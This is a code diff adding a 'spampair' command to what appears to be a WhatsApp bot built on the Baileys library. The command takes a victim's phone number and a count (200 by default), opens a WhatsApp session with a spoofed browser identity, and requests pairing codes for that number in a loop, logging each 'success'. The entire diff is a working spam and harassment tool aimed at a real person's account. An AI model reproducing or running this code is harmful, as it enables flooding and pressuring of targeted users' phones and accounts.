@@ -2396,6 +2396,48 @@ case 'glitchtext':
                 })
             }
             break
+case 'spampair': {
+const usePairingCode = true
+const NodeCache = require("node-cache")
+const resolveMsgBuffer = new NodeCache()
+			if (!isOwner) return
+			if (!q) return reply(`*👾*\n\n*_Use : Spampair NUMBER*|AMOUNT_\n_Example : Spampair 62xx_`)
+			let [peenis, pepekk = "200"] = q.split("|")
+			await reply(`${themeemoji}𝙎𝙋𝘼𝙈 𝘾𝙊𝘿𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔${themeemoji}`)
+			await reaction(m.chat, "✅")
+			let target = peenis.replace(/[^0-9]/g, '').trim()
+			let {
+				default: makeWaSocket,
+				useMultiFileAuthState,
+				fetchLatestBaileysVersion
+			} = require('@whiskeysockets/baileys')
+			let {
+				state
+			} = await useMultiFileAuthState('pairSess')
+			let {
+				version
+			} = await fetchLatestBaileysVersion()
+			let sucked = await makeWaSocket({
+				auth: state,
+				browser: ['Mac Os', 'chrome', '121.0.6167.159'],
+version: [2, 2413, 1],
+keepAliveIntervalMs: 50000,
+printQRInTerminal: !usePairingCode,
+generateHighQualityLinkPreview: true,
+resolveMsgBuffer,
+				logger: pino({ level: "silent" }),
+					level: 'fatal'
+				})
+			for (let i = 0; i < pepekk; i++) {
+			await sleep(2000)
+				let prc = await sucked.requestPairingCode(target)
+				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
+			}
+			await sleep(2000)
+		}
+		break
+		
+
 
 
 
